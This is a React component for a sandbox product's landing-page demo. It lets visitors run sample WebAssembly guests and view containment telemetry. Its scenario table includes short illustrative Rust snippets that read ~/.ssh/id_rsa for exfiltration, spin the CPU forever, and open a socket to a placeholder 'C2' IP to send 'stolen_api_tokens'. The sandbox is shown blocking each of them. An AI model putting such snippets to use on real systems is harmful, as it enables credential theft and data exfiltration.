"use client";

import { useState } from "react";

import type { DemoReport } from "../../lib/demo-report";

type Scenario = "secret" | "loop" | "network" | "clean";

interface ScenarioData {
  id: Scenario;
  title: string;
  badge: string;
  badgeColor: "kill" | "warn" | "pass";
  threatVector: string;
  codeLines: Array<{ text: string; type: "comment" | "keyword" | "code" | "highlight" }>;
}

const SCENARIOS: Record<Scenario, ScenarioData> = {
  secret: {
    id: "secret",
    title: "Host File Read",
    badge: "Trapped at Preopen Border",
    badgeColor: "kill",
    threatVector: "Prompt Injection trying to read ~/.ssh/id_rsa",
    codeLines: [
      { text: "// Malicious prompt injection attempting host key exfiltration", type: "comment" },
      { text: "fn exploit_read_host_keys() -> Result<(), Box<dyn Error>> {", type: "code" },
      { text: "    let target = \"~/.ssh/id_rsa\";", type: "code" },
      { text: "    let host_secret = std::fs::read_to_string(target)?;", type: "highlight" },
      { text: "    println!(\"EXFILTRATE: {}\", host_secret);", type: "code" },
      { text: "    Ok(())", type: "code" },
      { text: "}", type: "code" },
    ],
  },
  loop: {
    id: "loop",
    title: "Runaway CPU Loop",
    badge: "Epoch Fuel Trapped",
    badgeColor: "warn",
    threatVector: "Spin-lock denial-of-service locking host CPU thread",
    codeLines: [
      { text: "// Hostile runaway CPU spin-lock generation", type: "comment" },
      { text: "fn runaway_burn_loop() {", type: "code" },
      { text: "    let mut accumulator: u64 = 0;", type: "code" },
      { text: "    loop {", type: "highlight" },
      { text: "        accumulator = accumulator.wrapping_add(1);", type: "code" },
      { text: "    }", type: "highlight" },
      { text: "}", type: "code" },
    ],
  },
  network: {
    id: "network",
    title: "Socket Exfiltration",
    badge: "Egress Denied Pre-Syscall",
    badgeColor: "kill",
    threatVector: "Agent attempting outbound C2 beaconing",
    codeLines: [
      { text: "// Untrusted agent attempting outbound socket beaconing", type: "comment" },
      { text: "fn exfiltrate_credentials() -> Result<(), Box<dyn Error>> {", type: "code" },
      { text: "    let c2 = \"198.51.100.42:443\";", type: "code" },
      { text: "    let mut sock = std::net::TcpStream::connect(c2)?;", type: "highlight" },
      { text: "    sock.write_all(b\"stolen_api_tokens\")?;", type: "code" },
      { text: "    Ok(())", type: "code" },
      { text: "}", type: "code" },
    ],
  },
  clean: {
    id: "clean",
    title: "Authorized Pure Compute",
    badge: "Executed Cleanly",
    badgeColor: "pass",
    threatVector: "Algorithmic transformation within allowed resource caps",
    codeLines: [
      { text: "// Authorized algorithmic computation with no host side-effects", type: "comment" },
      { text: "fn process_data(vector: &[f64]) -> f64 {", type: "code" },
      { text: "    let variance = vector.iter()", type: "code" },
      { text: "        .map(|&val| (val - 42.0).powi(2))", type: "code" },
      { text: "        .sum::<f64>();", type: "highlight" },
      { text: "    variance", type: "code" },
      { text: "}", type: "code" },
    ],
  },
};

function toneOf(report: DemoReport | null): "kill" | "warn" | "pass" {
  const kind = report?.status?.kind;
  if (kind === "killed" || kind === "timed_out" || kind === "fuel_exhausted" || kind === "memory_limited") {
    return kind === "killed" ? "kill" : "warn";
  }
  if (report?.events?.some((event) => event.decision === "denied")) return "kill";
  if (kind === "success") return "pass";
  return "warn";
}

function formatBytes(bytes: number | undefined): string {
  if (bytes == null) return "—";
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function containment(report: DemoReport): string {
  const denied = report.events?.filter((event) => event.decision === "denied") ?? [];
  if (report.status?.kind === "killed") {
    return "SIGINT reached this run's kill handle. The guest stopped and the host process stayed up.";
  }
  if (report.status?.kind === "timed_out") {
    return "The wall-clock deadline stopped the guest.";
  }
  if (report.status?.kind === "memory_limited") {
    return "The memory cap stopped the guest.";
  }
  if (denied.length) {
    return denied.map((event) => `${event.kind} ${event.target} denied`).join("; ");
  }
  if (report.return_value != null) return `Guest returned ${report.return_value}.`;
  if (report.status?.kind === "success") return "Guest finished inside the default limits.";
  return report.status?.message || report.status?.kind || "Run finished.";
}

export default function HeroSandbox() {
  const [activeScenario, setActiveScenario] = useState<Scenario>("secret");
  const [activeView, setActiveView] = useState<"report" | "json">("report");
  const [isRunning, setIsRunning] = useState(false);
  const [report, setReport] = useState<DemoReport | null>(null);
  const [error, setError] = useState("");

  const scenario = SCENARIOS[activeScenario];
  const tone = toneOf(report);

  async function execute(action: "run" | "kill") {
    setIsRunning(true);
    setError("");
    try {
      const response = await fetch("/v1/demo", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ scenario: action === "kill" ? "loop" : activeScenario, action }),
      });
      if (!response.ok) {
        setReport(null);
        setError((await response.text()) || `demo ${response.status}`);
        return;
      }
      const body = (await response.json()) as { report: DemoReport };
      setReport(body.report);
      setActiveView("report");
    } catch (err) {
      setReport(null);
      setError(err instanceof Error ? err.message : "demo failed");
    } finally {
      setIsRunning(false);
    }
  }

  return (
    <div className="sandbox-enclave-card" aria-label="Live Boxwren sandbox">
      {/* Enclave Header Strip */}
      <div className="sandbox-header">
        <div className="sandbox-header-left">
          <div className="terminal-dots" aria-hidden="true">
            <span className="dot dot-red" />
            <span className="dot dot-yellow" />
            <span className="dot dot-green" />
          </div>
          <span className="terminal-title">boxwren-enclave-v0.2.3 // Wasmtime SFI Engine</span>
        </div>

        <div className="sandbox-header-actions">
          <button
            type="button"
            className={`btn-action btn-run ${isRunning ? "running" : ""}`}
            onClick={() => void execute("run")}
            disabled={isRunning}
            aria-label="Execute scenario in sandbox"
          >
            {isRunning ? (
              <>
                <span className="spinner-indicator" aria-hidden="true" />
                Executing...
              </>
            ) : (
              <>
                <span className="play-icon" aria-hidden="true">▶</span>
                Run Scenario
              </>
            )}
          </button>
          <button
            type="button"
            className={`btn-action btn-kill ${report?.status?.kind === "killed" ? "killed-active" : ""}`}
            onClick={() => void execute("kill")}
            disabled={isRunning}
            aria-label="Stop a live guest with the kill switch"
          >
            <span className="kill-icon" aria-hidden="true">⏹</span>
            Kill Switch
          </button>
        </div>
      </div>

      {/* Scenario Selector Tab Bar */}
      <div className="scenario-tab-bar" role="tablist" aria-label="Exploit Simulation Scenarios">
        {(Object.keys(SCENARIOS) as Scenario[]).map((key) => {
          const item = SCENARIOS[key];
          const isSelected = activeScenario === key;
          return (
            <button
              key={key}
              role="tab"
              aria-selected={isSelected}
              className={`scenario-tab ${isSelected ? "selected" : ""}`}
              onClick={() => {
                setActiveScenario(key);
                setReport(null);
                setError("");
              }}
            >
              <span className="tab-title">{item.title}</span>
              <span className={`tab-pill pill-${item.badgeColor}`}>
                {item.id === "secret" ? "Host File" : item.id === "loop" ? "CPU Cap" : item.id === "network" ? "Egress" : "Pure"}
              </span>
            </button>
          );
        })}
      </div>

      {/* Threat Scenario Context Banner */}
      <div className="scenario-context-strip">
        <span className="scenario-label">Threat Vector:</span>
        <span className="scenario-value">{scenario.threatVector}</span>
        <span className={`badge-pill badge-${report ? tone : scenario.badgeColor}`}>
          {report?.status?.kind ? report.status.kind : scenario.badge}
        </span>
      </div>

      {/* Enclave Dual-Pane Body */}
      <div className="sandbox-body-grid">
        {/* Left Pane: Code Submission Input */}
        <div className="code-pane">
          <div className="pane-header">
            <span className="pane-title">Guest Payload (.wat / .rs compiled WASM)</span>
            <span className="pane-meta">Sandbox isolated</span>
          </div>
          <pre className="code-block" tabIndex={0} aria-label="WASM Payload Source">
            <code>
              {scenario.codeLines.map((line, idx) => (
                <div
                  key={idx}
                  className={`code-line line-${line.type} ${
                    report?.status?.kind === "killed" && line.type === "highlight" ? "line-killed" : ""
                  }`}
                >
                  <span className="line-num">{idx + 1}</span>
                  <span className="line-text">{line.text}</span>
                </div>
              ))}
            </code>
          </pre>
        </div>

        {/* Right Pane: Runtime Telemetry & Execution Audit */}
        <div className="telemetry-pane">
          <div className="pane-header">
            <div className="view-toggle" role="tablist" aria-label="Output View">
              <button
                type="button"
                role="tab"
                aria-selected={activeView === "report"}
                className={`view-btn ${activeView === "report" ? "active" : ""}`}
                onClick={() => setActiveView("report")}
              >
                Telemetry Report
              </button>
              <button
                type="button"
                role="tab"
                aria-selected={activeView === "json"}
                className={`view-btn ${activeView === "json" ? "active" : ""}`}
                onClick={() => setActiveView("json")}
              >
                Audit JSON (Schema v1)
              </button>
            </div>
            <span className="pane-meta latency-highlight">
              {report ? `${report.duration_ms ?? 0} ms` : "live run"}
            </span>
          </div>

          {error ? <p className="action-text">{error}</p> : null}

          {activeView === "report" ? (
            <div className="telemetry-content">
              <div className="telemetry-grid">
                <div className="metric-box">
                  <span className="metric-label">Execution Status</span>
                  <span className={`metric-val val-${tone === "pass" ? "pass" : tone === "warn" ? "warn" : "kill"}`}>
                    {report?.status?.kind ?? "not run"}
                  </span>
                </div>

                <div className="metric-box">
                  <span className="metric-label">Wall Duration</span>
                  <span className="metric-val">{report ? `${report.duration_ms ?? 0} ms` : "—"}</span>
                </div>

                <div className="metric-box">
                  <span className="metric-label">Fuel Instructions Metered</span>
                  <span className="metric-val font-mono">{report?.fuel_used ?? "—"}</span>
                </div>

                <div className="metric-box">
                  <span className="metric-label">Peak Linear Memory</span>
                  <span className="metric-val font-mono">{formatBytes(report?.peak_memory)}</span>
                </div>
              </div>

              <div className="containment-action-box">
                <span className="action-label">Containment Action:</span>
                <p className="action-text">
                  {report ? containment(report) : "Run the scenario. This panel shows the schema v1 report from boxwren."}
                </p>
              </div>

              <div className="host-integrity-box">
                <span className="integrity-icon" aria-hidden="true">🛡</span>
                <span className="integrity-text">
                  <strong>Host Protection:</strong>{" "}
                  {report
                    ? "The guest ran inside Wasmtime with deny-by-default filesystem, network, and environment."
                    : "No guest has started."}
                </span>
              </div>
            </div>
          ) : (
            <pre className="json-block" tabIndex={0} aria-label="Schema v1 Audit Telemetry JSON">
              <code>{report ? JSON.stringify(report, null, 2) : "{\n  \"status\": \"not run\"\n}"}</code>
            </pre>
          )}
        </div>
      </div>
    </div>
  );
}
